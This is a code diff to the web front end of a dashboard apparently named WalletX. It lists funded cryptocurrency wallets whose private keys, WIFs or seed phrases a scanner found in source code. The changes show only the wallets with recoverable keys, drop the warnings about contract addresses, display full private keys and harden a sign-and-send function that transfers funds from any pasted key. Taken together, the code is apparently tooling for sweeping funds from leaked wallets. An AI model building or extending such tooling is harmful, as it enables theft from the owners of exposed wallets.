@@ -99,9 +99,9 @@ hdr .live{color:#0f0}
 var PAGE=0,PERPAGE=50,TOTAL=0,focus=null,wallets=[];
 
 function load(){
- var u='/api/balances?limit='+PERPAGE+'&offset='+(PAGE*PERPAGE)+'&funded_only=true&sort_by='+document.getElementById('sortBy').value;
+ var u='/api/balances?limit='+PERPAGE+'&offset='+(PAGE*PERPAGE)+'&funded_only=true&keyed_only=true&sort_by='+document.getElementById('sortBy').value;
  var c=document.getElementById('chainFilter').value;if(c)u+='&chain='+c;
- var q=document.getElementById('q').value;if(q)u='/api/search?q='+encodeURIComponent(q)+'&limit='+PERPAGE+'&offset='+(PAGE*PERPAGE);
+ var q=document.getElementById('q').value;if(q)u='/api/search?q='+encodeURIComponent(q)+'&limit='+PERPAGE+'&offset='+(PAGE*PERPAGE)+'&keyed_only=true';
  fetch(u).then(function(r){return r.json()}).then(function(d){
   wallets=d.rows||d;TOTAL=d.total||wallets.length;
   return fetch('/api/stats');
@@ -212,16 +212,20 @@ function showDetail(i){
  fetch('/api/wallet/'+addrEnc).then(function(r){return r.json()}).then(function(kd){
   var ks=document.getElementById('key');
   if(!kd.found){
-   ks.innerHTML='<div class="sec" style="border:1px solid #f44;border-radius:4px;padding:12px;background:#1a0000">'+
-    '<span class="lbl" style="color:#f44">⚠ CONTRACT ADDRESS — NO PRIVATE KEY</span>'+
-    '<div class="val" style="color:#f88;font-size:11px;margin-top:4px">'+kd.reason+'</div>'+
-    '<div style="color:#888;font-size:10px;margin-top:4px">This address was found in source code as a reference. It has a balance on-chain but is a smart contract, token, bridge, or system address — not a wallet anyone controls with a private key.</div></div>';return}
+   // No key = does not belong in WalletX — drop from view
+   ks.innerHTML='<div class="sec" style="color:#666;font-size:12px">No private key for this address — hidden from WalletX.</div>';
+   // Remove this card from leaderboard if it slipped through
+   try{ wallets.splice(i,1); TOTAL=Math.max(0,TOTAL-1); focus=null; renderLb();
+        document.getElementById('detail').innerHTML='<div style="color:#666;text-align:center;margin-top:40px">Select a keyed wallet</div>';
+   }catch(e){}
+   return}
   var hasKeys=(kd.hex_keys&&kd.hex_keys.length)||(kd.wifs&&kd.wifs.length)||(kd.seeds&&kd.seeds.length);
   if(!hasKeys){
-   ks.innerHTML='<div class="sec" style="border:1px solid #ffd700;border-radius:4px;padding:12px;background:#1a1a00">'+
-    '<span class="lbl" style="color:#ffd700">⚠ NO KEY MATERIAL FOUND</span>'+
-    '<div class="val" style="color:#ff8c00;font-size:11px;margin-top:4px">Address found in scanner memory but has no private key, WIF, or BIP39 seed associated with it.</div>'+
-    '<div style="color:#888;font-size:10px;margin-top:4px">Source: '+(kd.source||'unknown')+' · Found: '+(kd.timestamp||'unknown')+'</div></div>';return}
+   ks.innerHTML='<div class="sec" style="color:#666;font-size:12px">No key material — removed.</div>';
+   try{ wallets.splice(i,1); TOTAL=Math.max(0,TOTAL-1); focus=null; renderLb();
+        document.getElementById('detail').innerHTML='<div style="color:#666;text-align:center;margin-top:40px">Select a keyed wallet</div>';
+   }catch(e){}
+   return}
   var kh='<div class="sec" style="border:1px solid #0f0;border-radius:4px;padding:12px;background:#001a00">'+
    '<span class="lbl" style="color:#0f0">🔑 PRIVATE KEY MATERIAL (FULL — NEVER TRUNCATED)</span></div>';
   if(kd.hex_keys&&kd.hex_keys.length){
@@ -275,25 +279,47 @@ function buildTx(fromAddr){
   '</div>';
 }
 
+function _parseJsonResponse(r){
+ return r.text().then(function(t){
+  var ct=(r.headers.get('content-type')||'');
+  if(!t){
+   throw new Error('Empty response (HTTP '+r.status+')');
+  }
+  try{
+   var d=JSON.parse(t);
+   d._http=r.status;
+   return d;
+  }catch(e){
+   var snip=t.replace(/\s+/g,' ').slice(0,180);
+   throw new Error('Server returned non-JSON (HTTP '+r.status+(ct?'; '+ct:'')+'): '+snip);
+  }
+ });
+}
 function signAndSend(fromAddr,chain){
  var pk=document.getElementById('sendKey').value.trim();
  var to=document.getElementById('sendTo').value.trim();
  var amt=document.getElementById('sendAmt').value.trim();
- var ch=document.getElementById('sendChain').value.toLowerCase();
+ var ch=(document.getElementById('sendChain').value||'eth').toLowerCase();
+ if(ch==='ethw'||ch==='etc'){alert(ch.toUpperCase()+' send not supported via this button yet');return}
  if(!pk){alert('Paste your private key first');return}
  if(!to||!amt){alert('Enter recipient and amount');return}
+ if(isNaN(parseFloat(amt))||parseFloat(amt)<=0){alert('Amount must be a positive number');return}
  var out=document.getElementById('txOut');out.style.display='block';
- out.innerHTML='<span style="color:#ffd700">Signing and broadcasting...</span>';
- fetch('/api/send',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({private_key:pk,to:to,value_eth:parseFloat(amt),chain:ch})})
- .then(function(r){return r.json()}).then(function(d){
-  if(!d.ok){out.innerHTML='<span style="color:#f44">Failed: '+d.error+'</span>';return}
+ out.innerHTML='<span style="color:#ffd700">Signing and broadcasting on '+ch.toUpperCase()+'...</span>';
+ fetch('/api/send',{
+   method:'POST',
+   headers:{'Content-Type':'application/json','Accept':'application/json'},
+   body:JSON.stringify({private_key:pk,to:to,value_eth:parseFloat(amt),chain:ch,from:fromAddr||''})
+ })
+ .then(_parseJsonResponse).then(function(d){
+  if(!d.ok){out.innerHTML='<span style="color:#f44">Failed: '+(d.error||JSON.stringify(d))+'</span>';return}
   out.innerHTML='<div style="color:#0f0;font-size:12px"><b>SENT!</b></div>'+
-   '<div>TX: <a href="'+d.explorer+'" target="_blank" style="color:#ff8c00">'+d.tx_hash+'</a></div>'+
+   '<div>TX: <a href="'+(d.explorer||'#')+'" target="_blank" style="color:#ff8c00">'+d.tx_hash+'</a></div>'+
    '<div>From: '+d.from+'</div>'+
    '<div>To: '+d.to+'</div>'+
-   '<div>Value: '+d.value_eth+' '+d.chain.toUpperCase()+'</div>'+
-   '<div style="margin-top:4px"><a href="'+d.explorer+'" target="_blank" style="color:#0af">View on Explorer</a></div>';
- }).catch(function(e){out.innerHTML='<span style="color:#f44">Error: '+e.message+'</span>'});
+   '<div>Value: '+d.value_eth+' '+(d.chain||ch).toUpperCase()+'</div>'+
+   '<div style="margin-top:4px"><a href="'+(d.explorer||'#')+'" target="_blank" style="color:#0af">View on Explorer</a></div>';
+ }).catch(function(e){out.innerHTML='<span style="color:#f44">Error: '+(e&&e.message?e.message:e)+'</span>'});
 }
 function copyText(t){navigator.clipboard.writeText(t);var x=document.getElementById('toast');x.textContent='Copied!';x.style.display='block';setTimeout(function(){x.style.display='none'},2000)}
 document.addEventListener('click',function(e){var b=e.target.closest('.cbtn');if(b){var id=b.getAttribute('data-copy');if(id&&window[id])copyText(window[id])}});
@@ -303,8 +329,8 @@ function importKey(){
  if(!k){alert('Paste a key first');return}
  var st=document.getElementById('importStatus');
  st.innerHTML='<span style="color:#ffd700">Importing...</span>';
- fetch('/api/import-key',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({key:k})})
- .then(function(r){return r.json()}).then(function(d){
+ fetch('/api/import-key',{method:'POST',headers:{'Content-Type':'application/json','Accept':'application/json'},body:JSON.stringify({key:k})})
+ .then(_parseJsonResponse).then(function(d){
   var rs=document.getElementById('importResult');
   if(!d.ok){st.innerHTML='<span style="color:#f44">Failed</span>';rs.innerHTML='<span style="color:#f44">'+d.error+'</span>';return}
   st.innerHTML='<span style="color:#0f0">Imported!</span>';
